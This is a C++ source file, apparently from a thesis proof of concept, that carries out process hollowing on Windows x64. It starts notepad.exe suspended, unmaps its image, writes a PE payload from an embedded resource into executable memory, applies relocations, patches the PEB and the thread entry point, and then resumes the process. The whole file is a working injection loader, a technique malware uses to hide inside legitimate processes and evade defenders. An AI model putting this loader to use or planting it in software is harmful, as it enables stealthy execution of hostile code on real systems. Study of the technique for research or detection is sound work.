// Based on: https://www.ired.team/offensive-security/code-injection-process-injection/process-hollowing-and-pe-image-relocations

#include <iostream>
#include <Windows.h>
#include <winternl.h>
#include <psapi.h>
#include "resource.h"

using NtUnmapViewOfSection = NTSTATUS(WINAPI*)(HANDLE, PVOID);

typedef struct BASE_RELOCATION_BLOCK {
	DWORD PageAddress;
	DWORD BlockSize;
} BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

int main()
{
	// create destination process - this is the process to be hollowed out
	LPSTARTUPINFOA si = new STARTUPINFOA();
	LPPROCESS_INFORMATION pi = new PROCESS_INFORMATION();
	PROCESS_BASIC_INFORMATION* pbi = new PROCESS_BASIC_INFORMATION();
	DWORD returnLenght = 0;
	//CreateProcessA(NULL, (LPSTR)"D:\\thesis\\lpus\\other\\injection_tests\\injection-poc\\Process-Hollowing\\Process-Hollowing\\x64\\Release\\TargetExe.exe", NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, si, pi);
	CreateProcessA(NULL, (LPSTR)"notepad.exe", NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, si, pi);
	Sleep(1000);
	HANDLE destProcess = pi->hProcess;

	// get destination imageBase offset address from the PEB
	NtQueryInformationProcess(destProcess, ProcessBasicInformation, pbi, sizeof(PROCESS_BASIC_INFORMATION), &returnLenght);
	INT64 pebImageBaseOffset = (INT64)pbi->PebBaseAddress + 16;

	// get destination imageBaseAddress
	LPVOID destImageBase = 0;
	SIZE_T bytesRead = NULL;
	ReadProcessMemory(destProcess, (LPCVOID)pebImageBaseOffset, &destImageBase, 8, &bytesRead);

	HRSRC resource = FindResourceA(NULL, MAKEINTRESOURCEA(IDR_BINARY1), "BINARY");
	DWORD sourceFileSize = SizeofResource(NULL, resource);
	HGLOBAL resourceData = LoadResource(NULL, resource);
	void* pBinaryData = LockResource(resourceData);

	// read source file - this is the file that will be executed inside the hollowed process
	//HANDLE sourceFile = CreateFileA("D:\\thesis\\lpus\\other\\injection_tests\\injection-poc\\Process-Hollowing\\Process-Hollowing\\x64\Debug\\TargetExe.exe", GENERIC_READ, NULL, NULL, OPEN_ALWAYS, NULL, NULL);
	//DWORD sourceFileSize = GetFileSize(sourceFile, NULL);
	SIZE_T *fileBytesRead = 0;
	LPVOID sourceFileBytesBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sourceFileSize);
	memmove_s(sourceFileBytesBuffer, sourceFileSize, pBinaryData, sourceFileSize);
	//ReadFile(sourceFile, sourceFileBytesBuffer, sourceFileSize, NULL, NULL);

	// get source image size
	PIMAGE_DOS_HEADER sourceImageDosHeaders = (PIMAGE_DOS_HEADER)sourceFileBytesBuffer;
	PIMAGE_NT_HEADERS sourceImageNTHeaders = (PIMAGE_NT_HEADERS)((INT64)sourceFileBytesBuffer + sourceImageDosHeaders->e_lfanew);
	SIZE_T sourceImageSize = sourceImageNTHeaders->OptionalHeader.SizeOfImage;

	// carve out the destination image
	NtUnmapViewOfSection myNtUnmapViewOfSection = (NtUnmapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll"), "NtUnmapViewOfSection"));
	INT64 status = myNtUnmapViewOfSection(destProcess, destImageBase);

	// allocate new memory in destination image for the source image
	LPVOID newDestImageBase = VirtualAllocEx(destProcess, NULL, sourceImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	destImageBase = newDestImageBase;

	// get delta between sourceImageBaseAddress and destinationImageBaseAddress
	int64_t deltaImageBase = (INT64)destImageBase - sourceImageNTHeaders->OptionalHeader.ImageBase;

	// set sourceImageBase to destImageBase and copy the source Image headers to the destination image
	sourceImageNTHeaders->OptionalHeader.ImageBase = (INT64)destImageBase;
	WriteProcessMemory(destProcess, newDestImageBase, sourceFileBytesBuffer, sourceImageNTHeaders->OptionalHeader.SizeOfHeaders, NULL);
	WriteProcessMemory(destProcess, (LPVOID)pebImageBaseOffset, &newDestImageBase, 8, &bytesRead);

	// get pointer to first source image section
	PIMAGE_SECTION_HEADER sourceImageSection = (PIMAGE_SECTION_HEADER)((INT64)sourceFileBytesBuffer + sourceImageDosHeaders->e_lfanew + sizeof(IMAGE_NT_HEADERS));
	PIMAGE_SECTION_HEADER sourceImageSectionOld = sourceImageSection;

	// copy source image sections to destination
	for (int i = 0; i < sourceImageNTHeaders->FileHeader.NumberOfSections; i++)
	{
		PVOID destinationSectionLocation = (PVOID)((INT64)destImageBase + sourceImageSection->VirtualAddress);
		PVOID sourceSectionLocation = (PVOID)((INT64)sourceFileBytesBuffer + sourceImageSection->PointerToRawData);
		WriteProcessMemory(destProcess, destinationSectionLocation, sourceSectionLocation, sourceImageSection->SizeOfRawData, NULL);
		sourceImageSection++;
	}

	// get address of the relocation table
	IMAGE_DATA_DIRECTORY relocationTable = sourceImageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

	// patch the binary with relocations
	sourceImageSection = sourceImageSectionOld;
	for (int i = 0; i < sourceImageNTHeaders->FileHeader.NumberOfSections; i++)
	{
		BYTE* relocSectionName = (BYTE*)".reloc";
		if (memcmp(sourceImageSection->Name, relocSectionName, 5) != 0)
		{
			sourceImageSection++;
			continue;
		}

		INT64 sourceRelocationTableRaw = sourceImageSection->PointerToRawData;
		INT64 relocationOffset = 0;

		while (relocationOffset < relocationTable.Size) {
			PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)((INT64)sourceFileBytesBuffer + sourceRelocationTableRaw + relocationOffset);
			relocationOffset += sizeof(BASE_RELOCATION_BLOCK);
			INT64 relocationEntryCount = (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
			PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)((INT64)sourceFileBytesBuffer + sourceRelocationTableRaw + relocationOffset);

			for (INT64 y = 0; y < relocationEntryCount; y++)
			{
				relocationOffset += sizeof(BASE_RELOCATION_ENTRY);

				if (relocationEntries[y].Type == 0)
				{
					continue;
				}

				INT64 patchAddress = relocationBlock->PageAddress + relocationEntries[y].Offset;
				INT64 patchedBuffer = 0;
				ReadProcessMemory(destProcess, (LPCVOID)((INT64)destImageBase + patchAddress), &patchedBuffer, sizeof(INT64), &bytesRead);
				patchedBuffer += deltaImageBase;
				WriteProcessMemory(destProcess, (PVOID)((INT64)destImageBase + patchAddress), &patchedBuffer, sizeof(INT64), fileBytesRead);
			}
		}
	}

	// get context of the dest process thread
	LPCONTEXT context = new CONTEXT();
	context->ContextFlags = CONTEXT_INTEGER;
	GetThreadContext(pi->hThread, context);

	// update dest image entry point to the new entry point of the source image and resume dest image thread
	INT64 patchedEntryPoint = (INT64)destImageBase + sourceImageNTHeaders->OptionalHeader.AddressOfEntryPoint;

	//Thank god for this guy: https://forum.tuts4you.com/topic/39587-process-hollowing-in-windows-10/
	context->Rcx = patchedEntryPoint;
	SetThreadContext(pi->hThread, context);
	ResumeThread(pi->hThread);
	return 0;
}
